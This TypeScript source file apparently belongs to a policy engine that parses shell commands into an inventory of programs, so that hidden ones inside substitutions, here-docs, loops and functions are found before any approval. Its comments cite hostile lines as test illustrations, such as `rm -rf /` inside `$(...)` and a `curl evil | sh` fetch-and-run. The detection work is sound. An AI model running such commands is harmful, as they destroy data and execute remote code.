/**
 * Turns a token stream into the only thing the policy engine actually needs:
 * the list of programs that will run, with their arguments, plus an honest
 * account of everything we could not resolve.
 *
 * We do not build a full shell AST. We build a *flat command inventory*,
 * because the question is never "what is the parse tree" — it is "does
 * anything in here read my SSH key, and did I understand all of it".
 *
 * Command substitutions are parsed recursively, so `echo $(rm -rf /)` reports
 * `rm` as a command that runs. That is the whole point.
 */

import { tokenize, UNRESOLVED, type Token, type TokenizeOptions } from './tokenize.js';

/** Where a command sits in the shell structure. Affects trust, not just display. */
export type CommandContext =
  | 'top' // plain command in the top-level list
  | 'pipe' // downstream of a `|`
  | 'subst' // inside $(...) or backticks
  | 'procsubst' // inside <(...) or >(...)
  | 'subshell' // inside ( ... )
  | 'group' // inside { ...; }
  | 'loop' // inside for/while/until body
  | 'cond' // inside if/case condition or branch
  | 'function' // inside a function definition body
  | 'background'; // launched with &

export interface Redirect {
  /** The operator, e.g. `>`, `>>`, `2>`, `<`, `<<<`, `&>`. */
  op: string;
  /** Resolved target text, or {@link UNRESOLVED}. */
  target: string;
  /** True when the target is a file we can name. */
  isFile: boolean;
}

export interface Assignment {
  name: string;
  value: string;
}

export interface ParsedCommand {
  /** Program name as written (argv[0]). */
  name: string;
  /** Full argv, best-effort literal. */
  argv: string[];
  /** Per-arg quoting/expansion detail, aligned with argv. */
  tokens: Token[];
  assignments: Assignment[];
  redirects: Redirect[];
  contexts: CommandContext[];
  /** True when any argument contained something we could not resolve. */
  dynamic: boolean;
  /** Raw source slice, for display. */
  raw: string;
  /** Nesting depth (0 = top level). */
  depth: number;
}

export interface ShellFlags {
  hasControlFlow: boolean;
  hasSubshell: boolean;
  hasCommandSubstitution: boolean;
  hasProcessSubstitution: boolean;
  hasHeredoc: boolean;
  hasBackground: boolean;
  hasGlob: boolean;
  hasUnresolvedVariable: boolean;
  hasPipe: boolean;
  hasRedirectOut: boolean;
  hasFunctionDef: boolean;
}

export interface ParsedShell {
  commands: ParsedCommand[];
  flags: ShellFlags;
  /**
   * True when the tokenizer and parser fully accounted for the input.
   * When false, the action can never be auto-approved.
   */
  ok: boolean;
  issues: string[];
  source: string;
}

const CONTROL_KEYWORDS = new Set([
  'if',
  'then',
  'elif',
  'else',
  'fi',
  'for',
  'while',
  'until',
  'do',
  'done',
  'case',
  'esac',
  'in',
  'select',
  'time',
  'function',
  '!',
  '[[',
  ']]',
]);

/** Keywords after which a new command begins. */
const COMMAND_STARTERS = new Set(['then', 'else', 'do', 'in', '{', '(', ';;']);

const REDIRECT_OPS = new Set([
  '>',
  '>>',
  '<',
  '<<',
  '<<<',
  '>&',
  '<&',
  '<>',
  '&>',
  '&>>',
  '>|',
]);

const isRedirect = (t: Token) =>
  t.type === 'op' && (REDIRECT_OPS.has(t.text) || /^\d+(>>|>&|>\||<&|<>|>|<)$/.test(t.text));

/**
 * Only `<<` queues a body for the tokenizer to swallow. `<<<` is a here-*string*
 * — its operand is right there on the line — and a substring test for `<<`
 * catches it too, reporting a here-doc that does not exist.
 */
const isHeredocOp = (op: string) => op === '<<';

/**
 * Build a redirect record. Shared by both places a redirect can appear — after
 * a command, and in command position — because the two used to be written
 * separately and only one of them worked.
 */
function buildRedirect(op: string, target: Token | undefined): Redirect {
  const isWord = !!target && target.type === 'word';
  return {
    op,
    target: isWord ? target.text : UNRESOLVED,
    isFile:
      isWord &&
      !target.text.includes(UNRESOLVED) &&
      !/^&?\d+$/.test(target.text) &&
      target.text !== '/dev/null' &&
      target.text.toUpperCase() !== 'NUL',
  };
}

const SEPARATORS = new Set([';', '&&', '||', '&', '|', '|&', '\n', ';;', ';;&']);

const MAX_DEPTH = 8;

export function parseShell(src: string, opts: TokenizeOptions = {}): ParsedShell {
  const commands: ParsedCommand[] = [];
  const issues: string[] = [];
  const flags: ShellFlags = {
    hasControlFlow: false,
    hasSubshell: false,
    hasCommandSubstitution: false,
    hasProcessSubstitution: false,
    hasHeredoc: false,
    hasBackground: false,
    hasGlob: false,
    hasUnresolvedVariable: false,
    hasPipe: false,
    hasRedirectOut: false,
    hasFunctionDef: false,
  };
  let ok = true;

  const fail = (msg: string) => {
    ok = false;
    if (!issues.includes(msg)) issues.push(msg);
  };

  function walk(source: string, baseContexts: CommandContext[], depth: number) {
    if (depth > MAX_DEPTH) {
      fail('shell nesting too deep to analyse');
      return;
    }

    const { tokens, ok: tok, issues: tokIssues, heredocSubstitutions } = tokenize(source, opts);
    if (!tok) {
      ok = false;
      for (const m of tokIssues) if (!issues.includes(m)) issues.push(m);
    }

    /** Context stack for structural constructs encountered while scanning. */
    const stack: CommandContext[] = [];
    let pendingPipe = false;
    let pendingBackground = false;

    /**
     * `case` arms currently in scope, innermost last. `awaitingPattern` is true
     * between `in`/`;;` and the `)` that ends a pattern list, where the words
     * are patterns being matched — not programs being run.
     */
    const caseArms: { awaitingPattern: boolean }[] = [];

    /**
     * Record what a word's expansions imply.
     *
     * Called for the words we keep *and* for header words we skip. Skipping
     * `for f in $(curl x)` or `case $(uname) in` as a binding must not lose the
     * command inside it: that command really does run.
     */
    const noteExpansions = (tok: Token) => {
      for (const e of tok.expansions) {
        if (e.kind === 'command') {
          flags.hasCommandSubstitution = true;
          if (e.inner) walk(e.inner, [...baseContexts, ...stack, 'subst'], depth + 1);
        } else if (e.kind === 'process') {
          flags.hasProcessSubstitution = true;
          if (e.inner) walk(e.inner, [...baseContexts, ...stack, 'procsubst'], depth + 1);
        } else if (e.kind === 'param' && !e.resolved) {
          flags.hasUnresolvedVariable = true;
        } else if (e.kind === 'arith') {
          flags.hasUnresolvedVariable = true;
        } else if (e.kind === 'glob' || e.kind === 'brace') {
          flags.hasGlob = true;
        }
      }
    };

    // A here-document with an unquoted delimiter has its body expanded before
    // the command ever sees it, so `cat <<EOF` + `$(rm -rf /)` really does run
    // rm. The body is not a word, so it never reaches the loop below.
    for (const e of heredocSubstitutions) {
      flags.hasHeredoc = true;
      if (e.kind === 'command') {
        flags.hasCommandSubstitution = true;
        if (e.inner) walk(e.inner, [...baseContexts, 'subst'], depth + 1);
      } else if (e.kind === 'process') {
        flags.hasProcessSubstitution = true;
        if (e.inner) walk(e.inner, [...baseContexts, 'procsubst'], depth + 1);
      }
    }

    let idx = 0;
    while (idx < tokens.length) {
      const t = tokens[idx]!;

      if (t.type === 'comment') {
        idx++;
        continue;
      }

      if (t.type === 'newline') {
        pendingPipe = false;
        idx++;
        continue;
      }

      if (t.type === 'op') {
        const op = t.text;
        const pendingArm = caseArms[caseArms.length - 1];
        if (pendingArm?.awaitingPattern) {
          // Inside a case pattern list. In `case $x in (a|b) ...` the `(` is
          // not a subshell and the `|` is not a pipe; only `)` ends the list.
          if (op === ')') pendingArm.awaitingPattern = false;
          idx++;
          continue;
        }
        if (op === '(') {
          // Could be a subshell or the `()` of a function definition.
          const prev = tokens[idx - 1];
          const next = tokens[idx + 1];
          if (prev && prev.type === 'word' && next && next.type === 'op' && next.text === ')') {
            flags.hasFunctionDef = true;
            flags.hasControlFlow = true;
            stack.push('function');
            idx += 2;
            continue;
          }
          flags.hasSubshell = true;
          stack.push('subshell');
          idx++;
          continue;
        }
        if (op === ')') {
          const popped = stack.pop();
          if (popped === undefined) {
            // Unbalanced — likely a `case` pattern terminator. Not fatal, but noted.
            flags.hasControlFlow = true;
          }
          idx++;
          continue;
        }
        if (op === '|' || op === '|&') {
          flags.hasPipe = true;
          pendingPipe = true;
          idx++;
          continue;
        }
        if (op === '&') {
          flags.hasBackground = true;
          pendingBackground = true;
          idx++;
          continue;
        }
        if (SEPARATORS.has(op)) {
          // `;;` ends a case arm, so the next words are a pattern again.
          if ((op === ';;' || op === ';;&') && caseArms.length) {
            caseArms[caseArms.length - 1]!.awaitingPattern = true;
          }
          pendingPipe = false;
          idx++;
          continue;
        }
        if (isRedirect(t)) {
          // A redirect with no command in front of it still acts: `> file`
          // truncates or creates that file, and `> $(cmd)` runs cmd to work
          // out the name. Skipping it meant a free write-anywhere primitive
          // that appeared in no inventory at all.
          if (isHeredocOp(op)) flags.hasHeredoc = true;
          if (op.includes('>')) flags.hasRedirectOut = true;
          const rTarget = tokens[idx + 1];
          const redirect = buildRedirect(op, rTarget);
          if (rTarget && rTarget.type === 'word') {
            noteExpansions(rTarget);
            idx += 2;
          } else {
            idx++;
          }
          // Emitted as a command with no program: the engine reads its
          // redirects and treats the write like any other.
          commands.push({
            name: '',
            argv: [],
            tokens: [],
            assignments: [],
            redirects: [redirect],
            contexts: [...baseContexts, ...stack, 'top'],
            dynamic: redirect.target.includes(UNRESOLVED),
            raw: source.slice(t.start, rTarget ? rTarget.end : t.end),
            depth,
          });
          continue;
        }
        idx++;
        continue;
      }

      // t.type === 'word'
      const word = t.text;

      // Words in a case pattern list are patterns, not programs.
      // `case $x in rm) echo no;; esac` runs `echo`, never `rm`; reporting the
      // pattern as a command invents a program that cannot run.
      const arm = caseArms[caseArms.length - 1];
      if (arm?.awaitingPattern && !(word === 'esac' && t.quote === 'none')) {
        noteExpansions(t);
        idx++;
        continue;
      }

      if (word === '{' || word === '}') {
        if (word === '{') stack.push('group');
        else stack.pop();
        idx++;
        continue;
      }

      if (CONTROL_KEYWORDS.has(word) && t.quote === 'none') {
        flags.hasControlFlow = true;
        if (word === 'case') {
          // `case SUBJECT in` — the subject is a value being matched, not a
          // program. Without skipping it, `case $1 in start) ...` reports a
          // command whose *name* is an unresolved `$1`, which makes an
          // ordinary shell script permanently unknowable; and the pattern
          // after each `;;` becomes argv[0] of a command that never runs.
          stack.push('cond');
          caseArms.push({ awaitingPattern: false });
          idx++;
          while (idx < tokens.length) {
            const h = tokens[idx]!;
            idx++;
            if (h.type === 'word') {
              // The subject may still hide a real command: `case $(id -u) in`.
              noteExpansions(h);
              if (h.text === 'in' && h.quote === 'none') break;
            }
          }
          caseArms[caseArms.length - 1]!.awaitingPattern = true;
          continue;
        }
        if (word === 'esac') {
          stack.pop();
          caseArms.pop();
          idx++;
          continue;
        }
        if (word === 'for' || word === 'select') {
          stack.push('loop');
          // `for NAME in a b c; do` — the header is a binding, not a command.
          // Without skipping it, `for i in 1 2 3` is parsed as a program called
          // `i` taking the arguments `in 1 2 3`.
          idx++;
          // A C-style header, `for ((i=0; i<n; i++))`, contains semicolons of
          // its own, so it has to be consumed by bracket depth rather than by
          // looking for the next `;`.
          if (
            tokens[idx]?.type === 'op' && tokens[idx]!.text === '(' &&
            tokens[idx + 1]?.type === 'op' && tokens[idx + 1]!.text === '('
          ) {
            let depth = 0;
            while (idx < tokens.length) {
              const h = tokens[idx]!;
              if (h.type === 'op' && h.text === '(') depth++;
              else if (h.type === 'op' && h.text === ')') {
                depth--;
                if (depth === 0) {
                  idx++;
                  break;
                }
              }
              // `for ((i=0; i<$(curl n); i++))` runs curl once per evaluation.
              if (h.type === 'word') noteExpansions(h);
              idx++;
            }
          }
          while (idx < tokens.length) {
            const h = tokens[idx]!;
            if (h.type === 'op' && (h.text === ';' || h.text === '\n')) break;
            if (h.type === 'newline') break;
            if (h.type === 'word' && h.text === 'do') break;
            // The list being iterated is a binding, but it can still contain a
            // command that runs: `for f in $(curl https://x/list)`.
            if (h.type === 'word') noteExpansions(h);
            idx++;
          }
          continue;
        }
        if (word === 'function') {
          flags.hasFunctionDef = true;
          // `function NAME { ... }` and `function NAME () { ... }`. The name is
          // a binding, not a command. Without skipping it here the body's `{`
          // is taken as an argument of a command called NAME, and everything
          // the function would run drops out of the inventory entirely —
          // `function deploy { curl evil | sh; }` reported no curl at all.
          stack.push('function');
          idx++;
          if (tokens[idx]?.type === 'word') idx++;
          if (
            tokens[idx]?.type === 'op' && tokens[idx]!.text === '(' &&
            tokens[idx + 1]?.type === 'op' && tokens[idx + 1]!.text === ')'
          ) {
            idx += 2;
          }
          continue;
        }
        if (word === 'while' || word === 'until') {
          stack.push('loop');
        } else if (word === 'if' || word === 'case') {
          stack.push('cond');
        } else if (word === 'fi' || word === 'esac' || word === 'done') {
          stack.pop();
        } else if (word === 'function') {
          flags.hasFunctionDef = true;
        }
        idx++;
        continue;
      }

      // `coproc [NAME] command` runs a command asynchronously. Read as an
      // ordinary word it becomes a program called `coproc`, and the command it
      // actually runs disappears from the inventory entirely.
      if (word === 'coproc' && t.quote === 'none') {
        flags.hasBackground = true;
        idx++;
        // An optional NAME, but only when a command follows it — `coproc cat`
        // names no coprocess, `coproc C { ... }` does.
        const after = tokens[idx];
        const following = tokens[idx + 1];
        // Bash only permits a NAME before a *compound* command:
        // `coproc C { ... }` names a coprocess, `coproc rm -rf x` does not —
        // there the first word is the program. Accepting a name before a simple
        // command consumed `rm` and reported `-rf x` as the program.
        if (
          after?.type === 'word' &&
          /^[A-Za-z_][A-Za-z0-9_]*$/.test(after.text) &&
          ((following?.type === 'op' && following.text === '(') ||
            (following?.type === 'word' && following.text === '{'))
        ) {
          idx++;
        }
        continue;
      }

      if (COMMAND_STARTERS.has(word)) {
        idx++;
        continue;
      }

      // `name() { ... }` — a definition header. The name is a binding, not a
      // program that runs, and reporting it as one lets a signature accrue
      // trust from definitions that never executed anything.
      const fnParen = tokens[idx + 1];
      const fnClose = tokens[idx + 2];
      if (
        fnParen?.type === 'op' && fnParen.text === '(' &&
        fnClose?.type === 'op' && fnClose.text === ')'
      ) {
        flags.hasFunctionDef = true;
        flags.hasControlFlow = true;
        stack.push('function');
        idx += 3;
        continue;
      }

      // --- a simple command starts here ---
      const startTok = t;
      const assignments: Assignment[] = [];
      const argv: string[] = [];
      const argTokens: Token[] = [];
      const redirects: Redirect[] = [];
      let dynamic = false;
      let endOffset = t.end;

      // Leading NAME=VALUE assignments.
      while (idx < tokens.length) {
        const a = tokens[idx]!;
        if (a.type !== 'word') break;
        // The NAME must be unquoted, but the VALUE may be quoted:
        // `VSWHERE="/c/Program Files/x" cmd` is an ordinary assignment. Testing
        // the whole token's quoting rejected those, and the entire
        // `NAME=value` string then became argv[0] — a "program" that does not
        // exist, hiding the real command behind it.
        const m = /^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/s.exec(a.raw);
        if (!m) break;
        if (a.quote !== 'none' && !/^[A-Za-z_][A-Za-z0-9_]*=/.test(a.raw)) break;
        // `FOO=bar cmd` — only an assignment if it precedes argv[0].
        assignments.push({ name: m[1]!, value: a.text.slice(m[1]!.length + 1) });
        // The right-hand side is shell code too: `i=$(rm -rf x)` runs rm before
        // any program is invoked at all. Skipping this token without scanning
        // it was the single largest source of missed commands.
        noteExpansions(a);
        endOffset = a.end;
        idx++;
      }

      // argv and redirects
      while (idx < tokens.length) {
        const a = tokens[idx]!;
        if (a.type === 'newline') break;
        if (a.type === 'comment') {
          idx++;
          continue;
        }
        if (a.type === 'op') {
          if (isRedirect(a)) {
            const target = tokens[idx + 1];
            const op = a.text;
            if (isHeredocOp(op)) flags.hasHeredoc = true;
            if (op.includes('>')) flags.hasRedirectOut = true;
            redirects.push(buildRedirect(op, target));
            if (target && target.type === 'word') {
              // A redirect target can be a process substitution: `cat < <(rm x)`.
              noteExpansions(target);
              endOffset = target.end;
              idx += 2;
            } else {
              idx++;
            }
            continue;
          }
          break; // separator ends the command
        }
        // word
        if (a.text.includes(UNRESOLVED)) dynamic = true;
        noteExpansions(a);
        argv.push(a.text);
        argTokens.push(a);
        endOffset = a.end;
        idx++;
      }

      if (argv.length > 0) {
        const contexts: CommandContext[] = [...baseContexts, ...stack];
        if (pendingPipe) contexts.push('pipe');
        if (pendingBackground) contexts.push('background');
        if (contexts.length === 0) contexts.push('top');

        commands.push({
          name: argv[0]!,
          argv,
          tokens: argTokens,
          assignments,
          redirects,
          contexts,
          dynamic,
          raw: source.slice(startTok.start, endOffset),
          depth,
        });
        pendingBackground = false;
      } else if (assignments.length > 0) {
        // Bare assignment like `FOO=bar` — a real command with no program.
        commands.push({
          name: '',
          argv: [],
          tokens: [],
          assignments,
          redirects,
          contexts: [...baseContexts, ...stack, 'top'],
          dynamic,
          raw: source.slice(startTok.start, endOffset),
          depth,
        });
      }

      pendingPipe = false;
    }
  }

  walk(src, [], 0);

  // Note what we did *not* resolve, but do not call it a parse failure.
  //
  // `ok` means "we structurally accounted for this input" — unterminated
  // quotes make it false. Control flow and runtime variables are understood
  // *structure* with unknown *values*; conflating the two would make one
  // command in seven unapprovable, including harmless things like
  // `head -50 "$FILE"`. Unknown values widen the blast radius instead
  // (see classify.ts), which is the honest treatment: `echo $X` stays
  // harmless, `rm $X` becomes "unknown target, could be anywhere".
  if (flags.hasControlFlow) {
    issues.push('runs commands inside control flow, so how many times they run is not fixed');
  }
  if (flags.hasUnresolvedVariable) {
    issues.push('some values are only known at runtime');
  }

  return { commands, flags, ok, issues, source: src };
}
